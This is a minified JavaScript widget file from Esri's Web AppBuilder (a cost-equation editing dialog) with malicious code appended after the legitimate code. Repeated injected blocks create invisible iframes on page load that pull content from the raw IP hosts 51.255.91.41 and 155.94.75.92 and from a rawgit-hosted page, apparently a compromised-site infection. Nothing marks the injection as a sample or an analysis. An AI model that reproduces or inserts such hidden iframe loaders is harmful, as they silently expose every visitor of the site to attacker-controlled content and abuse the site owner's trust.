// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/CostAnalysis/setting/EditCostEquation.html":'\x3cdiv class\x3d"esriCTMainConfigurationContainer"\x3e\r\n  \x3cdiv\x3e\r\n    \x3cdiv class\x3d"esriCTPopupFields esriCTEllipsis"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv\x3e\r\n    \x3cdiv\x3e\r\n      \x3cdiv class\x3d"esriCTFieldContainer esriCTFullWidth"\x3e\r\n        \x3cdiv class\x3d"esriCTEditCostEquationLabel esriCTEllipsis esriCTVerticalCenterAlignLabel"\x3e\r\n          ${nls.costingInfo.geographyTitle}\x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTCostEquationFieldContainer"\x3e\r\n          \x3cdiv class\x3d"esriCTFullWidth" data-dojo-type\x3d"dijit/form/TextBox" disabled\x3dtrue data-dojo-attach-point\x3d"geographyValue"\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"esriCTFieldContainer esriCTFullWidth"\x3e\r\n        \x3cdiv class\x3d"esriCTEditCostEquationLabel esriCTEllipsis esriCTVerticalCenterAlignLabel"\x3e\r\n          ${nls.costingInfo.scenarioTitle}\x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTCostEquationFieldContainer"\x3e\r\n          \x3cdiv class\x3d"esriCTFullWidth" data-dojo-type\x3d"dijit/form/TextBox" disabled\x3dtrue data-dojo-attach-point\x3d"scenarioValue"\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"esriCTFieldContainer esriCTFullWidth"\x3e\r\n        \x3cdiv class\x3d"esriCTEditCostEquationLabel esriCTEllipsis esriCTVerticalCenterAlignLabel "\x3e\r\n          ${nls.costingInfo.costEquationTitle}\x3c/div\x3e\r\n          \x3cdiv class\x3d"esriCTFullWidth esriCTCostEquationInput" spellcheck\x3d"false" data-dojo-type\x3d"dijit/form/Textarea" data-dojo-attach-point\x3d"costEquationValue"\r\n            required\x3d"true"\x3e\r\n          \x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"esriCTFullWidth"\x3e\r\n      \x3cdiv class\x3d"esriCTHint" data-dojo-attach-point\x3d"costEquationHint"\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare jimu/dijit/Popup jimu/BaseWidget dojo/Evented dijit/_WidgetsInTemplateMixin dojo/text!./EditCostEquation.html dojo/_base/lang dojo/on dojo/dom-class dojo/query dojo/dom-attr".split(" "),function(e,f,g,h,k,l,c,m,d,n,p){return e([g,h,k],{templateString:l,popup:null,baseClass:"jimu-widget-cost-analysis-edit-equation",constructor:function(a){c.mixin(this,a)},postMixInProperties:function(){this.nls.common={};c.mixin(this.nls.common,window.jimuNls.common)},postCreate:function(){this.popup=
null;this.inherited(arguments);this._init()},_init:function(){this._createEditLayerRowPopup()},_createEditLayerRowPopup:function(){var a;this.popup=new f({titleLabel:this.layerTitle+": "+this.existingRowValues.featureTemplateValue,content:this.domNode,width:600,height:515,autoHeight:!0,"class":this.baseClass,buttons:[{label:this.nls.common.ok,onClick:c.hitch(this,"onOkButtonClicked")},{label:this.nls.common.cancel,classNames:["jimu-btn-vacation"],onClick:c.hitch(this,"onCancelButtonClicked")}]});
a=n(".title-label",this.popup.domNode)[0];p.set(a,"title",this.layerTitle+": "+this.existingRowValues.featureTemplateValue);this._setRowPopupValues()},onOkButtonClicked:function(){d.contains(this.costEquationValue.domNode,"esriCTCostEquationError")?alert(this.nls.costingInfo.validCostEquationMessage):(this.currentRow.costEquationInput.set("value",this.costEquationValue.getValue()),this.popup.close())},onCancelButtonClicked:function(){this.popup.close()},_setRowPopupValues:function(){var a,b;a=""===
this.existingRowValues.geographyValue?this.nls.costingInfo.noneValue:this.existingRowValues.geographyValue;b=""===this.existingRowValues.scenarioValue?this.nls.costingInfo.noneValue:this.existingRowValues.scenarioValue;this.geographyValue.set("value",a);this.scenarioValue.set("value",b);this.costEquationValue.set("value",this.existingRowValues.costEquationValue);m(this.costEquationValue,"KeyUp",c.hitch(this,function(a){this._costEquationKeyUp(a)}));this.costEquationHint.innerHTML=this.nls.costingInfo.hintText},
_costEquationKeyUp:function(a){var b;b=this.costEquationValue.domNode;d.contains(b,"esriCTCostEquationError")&&d.remove(b,"esriCTCostEquationError");this.validateCostEquation(a.currentTarget.value)||d.add(b,"esriCTCostEquationError")}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});